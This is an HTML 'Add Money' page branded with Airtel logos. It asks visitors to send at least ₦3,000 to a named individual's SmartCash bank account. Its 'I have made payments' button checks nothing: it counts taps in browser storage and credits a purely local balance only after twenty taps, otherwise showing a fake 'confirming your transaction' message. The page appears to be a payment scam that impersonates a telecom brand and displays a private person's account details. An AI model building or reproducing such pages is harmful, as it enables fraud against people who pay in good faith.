<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Add Money</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      overflow-x: hidden;
    }

    .floating-logo {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
      pointer-events: none;
    }

    .floating-logo img {
      position: absolute;
      width: 40px;
      opacity: 0.07;
      animation: float 25s linear infinite;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) rotate(0deg);
      }
      100% {
        transform: translateY(-100vh) rotate(360deg);
      }
    }

    .container {
      padding: 20px;
      text-align: center;
    }

    .logo-top {
      width: 100px;
      margin: 10px auto;
    }

    input[type="number"] {
      width: 80%;
      padding: 12px;
      font-size: 16px;
      margin: 20px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
      outline: none;
    }

    button {
      padding: 12px 25px;
      font-size: 16px;
      border: none;
      background-color: red;
      color: #fff;
      border-radius: 10px;
      margin: 10px auto;
      display: block;
      cursor: pointer;
    }

    .card {
      margin-top: 30px;
      padding: 20px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      display: none;
      position: relative;
    }

    .card h3 {
      margin: 10px 0;
    }

    .popup {
      position: fixed;
      top: 30%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      display: none;
      z-index: 1000;
    }

    .popup.show {
      display: block;
    }

    .dashboard-btn {
      margin-top: 30px;
      background-color: #333;
    }
  </style>
</head>
<body>
  <!-- Floating background -->
  <div class="floating-logo" id="logoBg"></div>

  <div class="container">
    <!-- Airtel logo -->
    <img src="airtel-logo.png" alt="Airtel Logo" class="logo-top" />

    <!-- Amount input -->
    <input type="number" id="amount" placeholder="Enter amount (₦3,000 minimum)" />

    <!-- Continue button -->
    <button onclick="submitAmount()">Continue</button>

    <!-- Popup -->
    <div class="popup" id="loaderPopup">Please wait...</div>

    <!-- Account details -->
    <div class="card" id="accountCard">
      <img src="airtel-logo.png" alt="Airtel Logo" class="logo-top" />
      <h3>Send to:</h3>
      <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
      <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
      <p><strong>Account Number:</strong> 812 489 0070</p>
      <button onclick="recordPayment()">I have made payments</button>
    </div>

    <!-- Back to Dashboard -->
    <button class="dashboard-btn" onclick="window.location.href='dashboard.html'">Back to Dashboard</button>
  </div>

  <script>
    // Add floating logos to background
    const logoBg = document.getElementById('logoBg');
    for (let i = 0; i < 30; i++) {
      const img = document.createElement('img');
      img.src = 'airtel-logo.png';
      img.style.left = `${Math.random() * 100}%`;
      img.style.top = `${Math.random() * 100}%`;
      img.style.animationDelay = `${Math.random() * 20}s`;
      logoBg.appendChild(img);
    }

    const loader = document.getElementById('loaderPopup');
    const card = document.getElementById('accountCard');

    // Load saved tap count and balance from localStorage
    let tapCount = parseInt(localStorage.getItem('tapCount')) || 0;

    function submitAmount() {
      const amount = parseInt(document.getElementById('amount').value);
      if (isNaN(amount) || amount < 3000) {
        showPopup("Please input minimum of ₦3,000");
        return;
      }

      loader.classList.add("show");

      setTimeout(() => {
        loader.classList.remove("show");
        card.style.display = "block";
      }, 2000);
    }

    function showPopup(message) {
      const popup = document.createElement("div");
      popup.className = "popup show";
      popup.innerText = message;
      document.body.appendChild(popup);
      setTimeout(() => {
        popup.remove();
      }, 3000);
    }

    function recordPayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);

      if (tapCount >= 20) {
        let balance = parseInt(localStorage.getItem('balance')) || 0;
        balance += 3000;
        localStorage.setItem('balance', balance);
        tapCount = 0;
        localStorage.setItem('tapCount', tapCount);
        showPopup("₦3,000 has been added to your balance!");
      } else {
        showPopup("We are confirming your transaction...");
      }
    }
  </script>
</body>
</html>
